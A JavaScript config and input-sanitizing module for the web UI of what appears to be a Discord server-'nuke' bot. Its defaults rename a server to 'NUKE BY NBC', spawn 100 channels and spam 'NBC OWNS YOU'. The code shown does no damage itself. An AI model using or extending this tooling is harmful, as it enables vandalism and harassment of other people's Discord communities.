// Mirror of main.py's Config. DISPLAY ONLY — the bot is the real source of truth,
// so drift here only affects UI placeholders.
export const BOT_DEFAULTS = {
  serverName: '..<<𝙉𝙐𝙆𝙀 𝘽𝙔 𝙉𝘽𝘾>>...',
  customChannelName: '「🖤」custom-by-nbc',
  channelCount: 100,
  spamMessage: '💀 **NBC OWNS YOU** 💀',
  serverDescription: 'NBC Owns you!! '.repeat(7).trim(),
  serverIconUrl: 'https://i.imgur.com/DzPUKvD.jpeg',
};

export const FIELDS = Object.keys(BOT_DEFAULTS);

const clampInt = (v, min, max) => {
  const n = Number.parseInt(v, 10);
  if (!Number.isFinite(n)) return null;
  return Math.min(max, Math.max(min, n));
};

const blankToNull = (v) => {
  if (v === null || v === undefined) return null;
  const s = String(v).trim();
  return s === '' ? null : s;
};

const asText = (v, max) => {
  const s = blankToNull(v);
  return s ? s.slice(0, max) : null;
};

// Channel names stay human-readable here; the bot owns the fancy presets.
const asChannel = (v) => {
  const s = blankToNull(v);
  return s ? s.slice(0, 100) : null;
};

const asUrl = (v) => {
  const s = blankToNull(v);
  if (!s) return null;
  try {
    const url = new URL(s);
    return url.protocol === 'http:' || url.protocol === 'https:' ? s.slice(0, 500) : null;
  } catch {
    return null;
  }
};

export function sanitizeOverrides(input = {}) {
  return {
    serverName: asText(input.serverName, 100),
    customChannelName: asChannel(input.customChannelName),
    channelCount: clampInt(input.channelCount, 1, 500),
    spamMessage: asText(input.spamMessage, 2000),
    serverDescription: asText(input.serverDescription, 190),
    serverIconUrl: asUrl(input.serverIconUrl),
  };
}

// Nulls are stripped so the bot's `or d(...)` fallbacks fire.
export function pickOverrides(row) {
  const out = {};
  for (const key of FIELDS) {
    if (row[key] !== null && row[key] !== undefined) out[key] = row[key];
  }
  return out;
}
